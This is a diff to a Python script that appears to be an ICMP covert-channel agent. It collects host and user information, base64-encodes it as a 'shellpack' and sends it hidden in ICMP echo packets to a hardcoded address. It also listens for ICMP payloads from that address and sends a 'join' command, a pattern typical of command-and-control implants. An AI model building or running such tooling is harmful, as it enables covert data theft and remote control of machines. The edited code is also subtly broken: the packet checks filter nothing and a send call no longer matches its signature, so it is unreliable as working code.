@@ -7,7 +7,6 @@ import socket
 import psutil
 import pwd
 import base64
-from typing import Optional
 
 
 dest = "192.168.157.6"
@@ -55,18 +54,9 @@ class Host:
             "heartbeat": self.heartbeat
             }
 
+        shellpack = str(shellpack).encode('utf-8')
+        shellpack = base64.b64encode(shellpack)
         return shellpack
-
-    def send(self, command: str, message: str | None = None) -> bool:
-
-        shellpack = self.build_shellpack(command, message)
-        encoded_shellpack = str(shellpack).encode('utf-8')
-        encoded_shellpack = base64.b64encode(encoded_shellpack)
-        
-        data = (IP(dst=dest, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=encoded_shellpack))
-        sr(data, timeout=0, verbose=0)
-        
-        return True
 
     def __str__(self) -> str:
         report =  f"[ Host Information ]\n"
@@ -76,22 +66,28 @@ class Host:
 
         return report
 
-def sniff_callback(pkt):
+class Target:
+    def __init__(self, ip):
+        self.ip = ip
+    
+    def send(self, shellpack: str) -> bool:
+        data = (IP(dst=self.ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
+        sr(data, timeout=0, verbose=0)
+        
+        return True
+
+def sniff_callback(packet):
     
     if packet[IP].src != dest:
         pass
-
-    if packet[ICMP].type != 8:
+    elif packet[ICMP].type != 8:
+        pass
+    elif packet[ICMP].id != ICMP_ID:
+        pass
+    elif not packet[Raw].load:
         pass
 
-    if packet[ICMP].id != ICMP_ID:
-        pass
-
-    if not packet[Raw].load:
-        pass
-
-
-    encoded_shellpack = (pkt[Raw].load).decode('utf-8', errors='ignore')
+    encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
     shellpack = base64.b64decode(encoded_shellpack)
     print(shellpack)
 
@@ -101,7 +97,8 @@ def setup_host() -> Host:
     print(host)
     
     # Send join command
-    host.send(command="join") 
+    target = Target("192.168.157.6")
+    target.send(command="join") 
 
     return host
 
